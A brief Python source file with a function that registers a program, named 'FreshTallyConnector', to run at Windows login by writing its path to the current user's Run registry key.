import os
import winreg

def add_to_startup(exe_path=None):
    if exe_path is None:
        exe_path = os.path.abspath(__file__)
    key = winreg.HKEY_CURRENT_USER
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    reg_key = winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(reg_key, "FreshTallyConnector", 0, winreg.REG_SZ, exe_path)
    winreg.CloseKey(reg_key)
